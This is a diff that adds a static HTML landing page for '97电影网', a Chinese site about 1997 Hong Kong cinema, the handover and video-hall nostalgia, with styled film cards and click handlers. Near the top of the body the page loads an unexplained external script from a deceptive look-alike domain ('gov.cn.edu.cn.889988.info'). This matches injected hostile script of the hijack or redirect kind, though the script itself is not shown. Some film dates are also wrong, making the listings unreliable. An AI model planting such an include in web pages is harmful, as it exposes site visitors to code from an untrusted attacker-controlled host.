@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>97电影网 - 1997港片黄金/回归记忆/录像厅经典片单导航 | 97电影网</title>
+<meta name="description" content="97电影网（97dianyingwang-h5）以1997年为时间锚点，收录港片黄金年代经典、回归题材影片、录像厅记忆与97年代片单，重温华语电影最辉煌的一年。">
+<meta name="keywords" content="97电影网, 97dianyingwang-h5, 1997港片, 香港回归电影, 港片黄金年代, 录像厅经典, 97电影片单">
+<meta name="author" content="97电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#0d0d0d;--bg2:#151515;--card:#1c1c1c;
+  --red:#e60012;--cyan:#00e5ff;--gold:#ffd700;--white:#f5f5f5;
+  --text:#f0f0f0;--text2:#b0b0b0;--muted:#777;
+  --line:rgba(230,0,18,.3);--radius:12px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(800px 400px at 75% -5%,rgba(230,0,18,.14),transparent 60%),
+    radial-gradient(700px 380px at 0% 20%,rgba(0,229,255,.08),transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 扫描线 */
+.scanlines{position:fixed;inset:0;z-index:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,.015) 2px,rgba(255,255,255,.015) 4px)}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:101;background:rgba(13,13,13,.93);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:11px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:20px;font-weight:900;display:flex;align-items:center;gap:8px;letter-spacing:1px}
+.logo .n{font-family:ui-monospace,monospace;color:var(--red);font-size:22px}
+.logo b{color:var(--cyan)}
+.year-badge{font-size:11px;font-weight:800;color:var(--gold);border:1px solid var(--line);padding:3px 10px;border-radius:4px;font-family:ui-monospace,monospace;letter-spacing:1px}
+.nav-menu{display:flex;gap:16px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:5px 2px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--cyan)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--cyan);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+.hero{margin-top:54px;padding:60px 20px 44px;position:relative;z-index:1}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(230,0,18,.1);color:var(--red);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:16px;border-radius:4px;font-family:ui-monospace,monospace}
+.hero h1{font-size:clamp(32px,5vw,52px);font-weight:900;line-height:1.05;margin-bottom:14px}
+.hero h1 .hl{color:var(--cyan)}
+.hero-desc{color:var(--text2);font-size:14px;margin-bottom:24px;line-height:1.9}
+.btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:12px 28px;background:linear-gradient(90deg,var(--red),var(--gold));color:#000;font-weight:800;font-size:14px;letter-spacing:1px;transition:.25s;border-radius:4px}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(230,0,18,.3)}
+.btn-sub{padding:12px 28px;border:1px solid var(--cyan);color:var(--cyan);font-weight:700;font-size:14px;border-radius:4px;transition:.25s}
+.btn-sub:hover{background:rgba(0,229,255,.08)}
+
+/* 97时钟 */
+.clock-wrap{position:relative;display:flex;align-items:center;justify-content:center}
+.clock{width:100%;max-width:340px;aspect-ratio:1;position:relative;border-radius:50%;border:3px solid var(--red);background:radial-gradient(circle,#1a1a1a,#0d0d0d);box-shadow:0 0 40px rgba(230,0,18,.2),inset 0 0 40px rgba(0,0,0,.5)}
+.clock::before{content:'';position:absolute;inset:12px;border:1px solid rgba(0,229,255,.2);border-radius:50%}
+.clock-num{position:absolute;font-family:ui-monospace,monospace;font-size:13px;font-weight:800;color:var(--gold)}
+.clock-center{position:absolute;width:14px;height:14px;border-radius:50%;background:var(--red);top:50%;left:50%;transform:translate(-50%,-50%);z-index:5}
+.hand{position:absolute;bottom:50%;left:50%;transform-origin:bottom center;background:var(--cyan);border-radius:2px}
+.hour-hand{width:4px;height:28%;margin-left:-2px;animation:tick 43200s linear infinite;background:var(--gold)}
+.min-hand{width:3px;height:38%;margin-left:-1.5px;animation:tick 3600s linear infinite;background:var(--cyan)}
+.sec-hand{width:2px;height:44%;margin-left:-1px;animation:tick 60s steps(60) infinite;background:var(--red)}
+@keyframes tick{to{transform:rotate(360deg)}}
+.clock-label{position:absolute;bottom:-36px;left:50%;transform:translateX(-50%);font-size:12px;color:var(--muted);font-family:ui-monospace,monospace;white-space:nowrap}
+
+.section{max-width:1200px;margin:0 auto;padding:44px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:24px;text-align:center}
+.sec-head h2{font-size:26px;font-weight:900}
+.sec-head h2 .ac{color:var(--cyan)}
+.sec-head p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* 回归记忆带 */
+.memory-section{background:linear-gradient(180deg,transparent,rgba(28,28,28,.5))}
+.memory-bar{display:flex;gap:0;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;max-width:900px;margin:0 auto}
+.memory-cell{flex:1;padding:20px 12px;text-align:center;background:var(--card);border-right:1px solid var(--line);transition:.25s;cursor:pointer}
+.memory-cell:last-child{border-right:none}
+.memory-cell:hover{background:rgba(230,0,18,.12)}
+.memory-cell .yr{font-size:22px;font-weight:900;color:var(--gold);font-family:ui-monospace,monospace}
+.memory-cell h4{font-size:13px;font-weight:800;margin:4px 0}
+.memory-cell p{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* 四大栏目 */
+.cols-section{background:var(--bg2)}
+.cols-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.col-card{background:var(--card);border:1px solid var(--line);border-left:4px solid var(--red);border-radius:var(--radius);padding:22px;transition:.3s;cursor:pointer}
+.col-card:hover{transform:translateY(-4px);border-left-color:var(--cyan);box-shadow:0 10px 30px rgba(0,0,0,.5)}
+.col-card .em{font-size:30px;margin-bottom:8px}
+.col-card h3{font-size:17px;font-weight:800;margin-bottom:6px}
+.col-card p{font-size:13px;color:var(--text2);line-height:1.75;margin-bottom:10px}
+.col-card .tags{display:flex;gap:6px;flex-wrap:wrap}
+.tag-i{font-size:11px;color:var(--cyan);border:1px solid rgba(0,229,255,.3);padding:3px 9px;border-radius:3px;background:rgba(0,229,255,.05)}
+
+/* 放映墙 */
+.wall-section{background:var(--bg)}
+.wall-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.wall-item{background:var(--card);border:1px solid var(--line);border-radius:10px;overflow:hidden;cursor:pointer;transition:.25s}
+.wall-item:hover{transform:scale(1.03);border-color:var(--gold);z-index:2;position:relative}
+.wall-cover{aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;font-size:36px;position:relative}
+.wall-item:nth-child(8n+1) .wall-cover{background:linear-gradient(160deg,#3a0a0a,#1a1a1a)}
+.wall-item:nth-child(8n+2) .wall-cover{background:linear-gradient(160deg,#0a2a3a,#1a1a1a)}
+.wall-item:nth-child(8n+3) .wall-cover{background:linear-gradient(160deg,#3a2a0a,#1a1a1a)}
+.wall-item:nth-child(8n+4) .wall-cover{background:linear-gradient(160deg,#1a3a2a,#1a1a1a)}
+.wall-item:nth-child(8n+5) .wall-cover{background:linear-gradient(160deg,#2a0a3a,#1a1a1a)}
+.wall-item:nth-child(8n+6) .wall-cover{background:linear-gradient(160deg,#3a3a0a,#1a1a1a)}
+.wall-item:nth-child(8n+7) .wall-cover{background:linear-gradient(160deg,#0a3a3a,#1a1a1a)}
+.wall-item:nth-child(8n+8) .wall-cover{background:linear-gradient(160deg,#3a1a0a,#1a1a1a)}
+.wall-cover .yr{position:absolute;top:8px;left:8px;font-size:11px;color:var(--gold);font-family:ui-monospace,monospace;background:rgba(0,0,0,.5);padding:2px 6px;border-radius:3px}
+.wall-body{padding:10px 12px}
+.wall-body h4{font-size:13px;font-weight:800}
+.wall-body p{font-size:11px;color:var(--muted);margin-top:2px}
+
+/* 关于 */
+.about-section{background:var(--bg2)}
+.about-box{max-width:800px;margin:0 auto;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:28px;border-top:3px solid var(--gold)}
+.about-box h3{font-size:18px;font-weight:800;margin-bottom:12px}
+.about-box p{font-size:13px;color:var(--text2);line-height:1.9;margin-bottom:10px}
+
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:30px 20px 16px;text-align:center;color:var(--muted)}
+.footer-logo{font-size:18px;font-weight:900;color:var(--text);margin-bottom:10px}
+.footer-logo b{color:var(--cyan)}
+.footer-links{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:var(--text2);font-size:12px}
+.footer-links a:hover{color:var(--cyan)}
+.footer-copy{font-size:11px;border-top:1px solid var(--line);padding-top:14px;line-height:1.9}
+.footer-copy a{color:var(--cyan)}
+
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:30px}
+  .clock-wrap{order:-1;max-width:280px;margin:0 auto}
+  .cols-grid{grid-template-columns:1fr}
+  .wall-grid{grid-template-columns:repeat(2,1fr)}
+  .memory-bar{flex-wrap:wrap}
+  .memory-cell{flex:1 1 33%;border-bottom:1px solid var(--line)}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:104px;padding:30px 16px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="scanlines"></div>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="n">97</span>电影网</div>
+    <div class="year-badge">1997 · 港片黄金</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#memory">回归记忆</a></li>
+        <li><a href="#cols">四大栏目</a></li>
+        <li><a href="#wall">放映墙</a></li>
+        <li><a href="#about">关于97</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="tag">97dianyingwang-h5 · 1997 港片黄金档案</span>
+      <h1><span class="hl">1997</span><br>港片最后的黄金年</h1>
+      <p class="hero-desc">97电影网以1997年为时间锚点，收录港片黄金年代的经典、回归题材影片、录像厅记忆与97年代片单。那一年，《春光乍泄》戛纳最佳导演，《一个好人》票房冠军，《香港制造》开启独立新声——华语电影最辉煌的一年，值得反复重温。</p>
+      <div class="btns">
+        <a href="#cols" class="btn-main">🎬 进入97片库</a>
+        <a href="#wall" class="btn-sub">看放映墙</a>
+      </div>
+    </div>
+    <div class="clock-wrap">
+      <div class="clock">
+        <div class="clock-num" style="top:6%;left:50%;transform:translateX(-50%)">XII</div>
+        <div class="clock-num" style="top:50%;right:8%;transform:translateY(-50%)">III</div>
+        <div class="clock-num" style="bottom:6%;left:50%;transform:translateX(-50%)">VI</div>
+        <div class="clock-num" style="top:50%;left:8%;transform:translateY(-50%)">IX</div>
+        <div class="hour-hand"></div>
+        <div class="min-hand"></div>
+        <div class="sec-hand"></div>
+        <div class="clock-center"></div>
+      </div>
+      <div class="clock-label">HONG KONG · 1997</div>
+    </div>
+  </div>
+</section>
+
+<section id="memory" class="section memory-section">
+  <div class="sec-head">
+    <h2>🎌 <span class="ac">回归记忆带</span> · 97 前后</h2>
+    <p>四个时间节点，串起一个时代的转折</p>
+  </div>
+  <div class="memory-bar">
+    <div class="memory-cell"><div class="yr">1995</div><h4>《大话西游》上映</h4><p>起初票房惨淡，后来成为一代人的文化符号</p></div>
+    <div class="memory-cell"><div class="yr">1996</div><h4>《古惑仔》系列爆发</h4><p>录像厅时代的现象级港片</p></div>
+    <div class="memory-cell"><div class="yr">1997</div><h4>回归之年</h4><p>《春光乍泄》《香港制造》震惊国际</p></div>
+    <div class="memory-cell"><div class="yr">1998</div><h4>《风云雄霸天下》</h4><p>CG特效港片新尝试，时代转折</p></div>
+  </div>
+</section>
+
+<section id="cols" class="section cols-section">
+  <div class="sec-head">
+    <h2>🎞️ <span class="ac">四大栏目</span></h2>
+    <p>97电影网的四个方向</p>
+  </div>
+  <div class="cols-grid">
+    <div class="col-card">
+      <div class="em">🏙️</div>
+      <h3>港片黄金</h3>
+      <p>90年代中后期的港片全盛期：枪战、武侠、无厘头、黑帮、警匪，周润发、刘德华、张国荣、梁朝伟的巅峰年代。</p>
+      <div class="tags">
+        <span class="tag-i">英雄本色</span>
+        <span class="tag-i">无间道</span>
+        <span class="tag-i">东邪西毒</span>
+        <span class="tag-i">重庆森林</span>
+      </div>
+    </div>
+    <div class="col-card">
+      <div class="em">🇭🇰</div>
+      <h3>回归那年</h3>
+      <p>1997年前后以香港回归为背景或题材的影片，记录一个城市的历史转折与身份认同。</p>
+      <div class="tags">
+        <span class="tag-i">香港制造</span>
+        <span class="tag-i">甜蜜蜜</span>
+        <span class="tag-i">春光乍泄</span>
+        <span class="tag-i">一个都不能少</span>
+      </div>
+    </div>
+    <div class="col-card">
+      <div class="em">📼</div>
+      <h3>录像厅记忆</h3>
+      <p>五块钱看一晚、一排排木椅、港片配音、VCD 租碟——80后90后的集体观影记忆。</p>
+      <div class="tags">
+        <span class="tag-i">古惑仔</span>
+        <span class="tag-i">唐伯虎点秋香</span>
+        <span class="tag-i">赌神</span>
+        <span class="tag-i">九品芝麻官</span>
+      </div>
+    </div>
+    <div class="col-card">
+      <div class="em">🏆</div>
+      <h3>97 国际奖项</h3>
+      <p>1997年华人电影在国际电影节的高光时刻：戛纳、威尼斯、柏林，中国电影走向世界。</p>
+      <div class="tags">
+        <span class="tag-i">春光乍泄</span>
+        <span class="tag-i">河流</span>
+        <span class="tag-i">风月</span>
+        <span class="tag-i">我爱厨房</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="wall" class="section wall-section">
+  <div class="sec-head">
+    <h2>🎬 <span class="ac">放映墙</span> · 97年代经典片单</h2>
+    <p>点击海报查看影片信息（演示）</p>
+  </div>
+  <div class="wall-grid">
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1997</span>🌹</div><div class="wall-body"><h4>春光乍泄</h4><p>王家卫 / 戛纳最佳导演</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1997</span>🎸</div><div class="wall-body"><h4>香港制造</h4><p>陈果 / 独立电影新声</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1996</span>🃏</div><div class="wall-body"><h4>古惑仔</h4><p>录像厅现象级港片</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1994</span>🐵</div><div class="wall-body"><h4>大话西游</h4><p>后来成为文化符号</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1997</span>🍜</div><div class="wall-body"><h4>甜蜜蜜</h4><p>陈可辛 / 时代爱情</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1995</span>🎤</div><div class="wall-body"><h4>宋家皇朝</h4><p>历史史诗 / 1997重映</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1997</span>👮</div><div class="wall-body"><h4>一个好人</h4><p>成龙 / 年度票房冠军</p></div></div>
+    <div class="wall-item"><div class="wall-cover"><span class="yr">1996</span>🗡️</div><div class="wall-body"><h4>大三元</h4><p>徐克 / 警匪喜剧</p></div></div>
+  </div>
+</section>
+
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>📜 <span class="ac">关于 97</span></h2>
+    <p>为什么是 1997？</p>
+  </div>
+  <div class="about-box">
+    <h3>1997 年的意义</h3>
+    <p>1997 年 7 月 1 日，香港回归祖国。这一年不仅是一个政治历史节点，也是华语电影史上极为特殊的一年——港片黄金时代的最后辉煌，与新时代的开端，交汇于此。</p>
+    <p>王家卫凭《春光乍泄》成为首位获得戛纳最佳导演的华人导演；陈果的《香港制造》以50万港币成本震动影坛；成龙《一个好人》蝉联年度票房冠军；张艺谋《有话好好说》、姜文《阳光灿烂的日子》的余波仍在。这是华语电影人才密度最高、类型最丰富的时代。</p>
+    <p>97电影网不存片、不盗链，只做导航与记忆。所有卡片点击为 # 占位演示。</p>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo"><span class="n">97</span>电影网</div>
+  <div class="footer-links">
+    <a href="#memory">回归记忆</a>
+    <a href="#cols">四大栏目</a>
+    <a href="#wall">放映墙</a>
+    <a href="#about">关于97</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 97电影网 (97dianyingwang-h5). 1997港片黄金年代导航站.<br>
+    网站地址: <a href="https://97dianyingwang-h5.github.io">https://97dianyingwang-h5.github.io</a><br>
+    <span style="opacity:.7">1997 · 港片最后的黄金年 · 华语电影最辉煌的时代</span>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.col-card').forEach(function(c){c.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.wall-item').forEach(function(w){w.addEventListener('click',function(){alert('97片单：'+this.querySelector('h4').textContent+'\n\n'+this.querySelector('p').textContent+'\n\n静态演示页，点击后跳详情（内链 # 占位）。');});});
+document.querySelectorAll('.memory-cell').forEach(function(m){m.addEventListener('click',function(){alert(this.querySelector('.yr').textContent+' · '+this.querySelector('h4').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.nav-menu a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});});
+</script>
+</body>
+</html>
